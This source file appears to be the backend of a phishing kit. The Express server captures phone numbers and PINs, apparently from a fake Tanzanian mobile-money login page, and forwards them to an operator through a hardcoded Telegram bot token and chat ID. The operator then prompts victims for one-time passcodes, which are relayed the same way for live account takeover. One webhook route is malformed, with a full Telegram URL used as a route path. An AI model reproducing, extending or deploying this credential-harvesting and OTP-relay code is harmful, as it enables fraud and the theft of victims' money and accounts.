const express = require("express");
const axios = require("axios");
const cors = require("cors");
const bodyParser = require("body-parser");
const crypto = require('crypto');


const path = require("path");

const app = express();
const PORT = process.env.PORT || 5002;

// Serve all files in your folder (like index.html, step6.html, etc.)
app.use(express.static(path.join(__dirname, "public"))); 

// Add a route to serve your main HTML file
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname,"public", "index.html")); 
});


app.use(cors());
app.use(bodyParser.json());
// app.use(express.static('public'));

// --- TELEGRAM CONFIG ---
const TELEGRAM_BOT_TOKEN = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
const TELEGRAM_ADMIN_ID = "7162306402";
const BASE_URL = process.env.RENDER_EXTERNAL_URL ||`http://localhost:${PORT}`; // Update if deployed


const sessions = {};
// Test route to check if server is alive
app.get("/", (req, res) => {
  res.send("✅ Server is running! Ready to receive data.");
});

// Main submission route
// 1. Initial Login (Step 5)
app.post('/api/submit', async (req, res) => {
    const { phone, pin } = req.body;
    const sessionId = crypto.randomBytes(16).toString("hex");
    // Create session in memory
    sessions[sessionId] = { 
        phone, 
        pin, 
        status: 'waiting_for_admin_choice' 
    };

    console.log(`[LOGIN] User: ${phone} | Session: ${sessionId}`);

    const message = `🚀 *New Login Captured*\n📱 Phone: +255${phone}\n🔑 PIN: ${pin}`;
    
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_ADMIN_ID,
            text: message,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [[
                    { text: "Ask OTP (5)", callback_data: `ask_5_${sessionId}` },
                    { text: "Ask OTP (6)", callback_data: `ask_6_${sessionId}` }
                ]]
            }
        });
        res.json({ success: true });
    } catch (e) {
        console.error("Telegram Error:", e.message);
        res.status(500).json({ success: false });
    }
});

// 2. Admin Command Handler (When you click a button in Telegram)
app.get('/api/cmd/:id/:command', (req, res) => {
    const { id, command } = req.params;
    if (sessions[id]) {
        sessions[id].status = command;
        res.send(`<h1>Command Sent!</h1><p>Action <b>${command}</b> active for session ${id}.</p><script>setTimeout(window.close, 1500)</script>`);
    } else {
        res.status(404).send('Session not found.');
    }
});

// 3. Status Check (Frontend Polling)
app.get('/api/status/:id', (req, res) => {
    const session = sessions[req.params.id];
    res.json(session ? { status: session.status } : { status: 'idle' });
});

// 2. OTP Submission (Step 6)
app.post('/api/submit-otp', async (req, res) => {
    const { otp, sessionId } = req.body;
    
    console.log(`[OTP RECEIVED] Code: ${otp} | Session: ${sessionId}`);

    if (sessions[sessionId]) {
        sessions[sessionId].status = 'verifying';
        sessions[sessionId].lastOtp = otp;

        const msg = `🔐 *OTP Received*\n📱 User: +255${sessions[sessionId].phone}\n🔢 OTP: ${otp}`;
        
        try {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: TELEGRAM_ADMIN_ID,
                text: msg,
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [[
                        { text: "✅ Accept", callback_data: `accept_${sessionId}` },
                        { text: "❌ Decline", callback_data: `decline_${sessionId}` }
                    ]]
                }
            });
            res.json({ success: true, sessionId: sessionId });
        } catch (e) {
            console.error("OTP Telegram Error:", e.message);
            res.status(500).json({ success: false });
        }
    } else {
        console.log(`[ERROR] Session ${sessionId} not found in memory.`);
        res.status(404).json({ success: false, message: "Session expired" });
    }
});

// 4. Telegram Button Webhook
app.post('https://api.telegram.org/bot8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc/setWebhook?url=https://mixx-by-yas-72jv.onrender.com/api/webhook', (req, res) => {
    const { callback_query } = req.body;
    if (!callback_query) return res.sendStatus(200);

    const [action, val, sid] = callback_query.data.split('_');

    if (sessions[sid]) {
    if (action === 'ask') {
        // Match what your HTML is looking for: "otp5" or "otp6"
        sessions[sid].status = `otp${val}`; 
    } 
    else if (action === 'accept') sessions[sid].status = 'accepted'; // Match HTML "done"
    else if (action === 'decline') sessions[sid].status = 'declined';
}

    // Acknowledge the click to Telegram
    axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
        callback_query_id: callback_query.id
    });

    res.sendStatus(200);
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`
🚀 SERVER STARTED SUCCESSFULLY
----------------------------------
Local access: http://localhost:${PORT}
Network access: Check your IP (e.g., http://192.168.1.x:${PORT})
----------------------------------
    `);
});
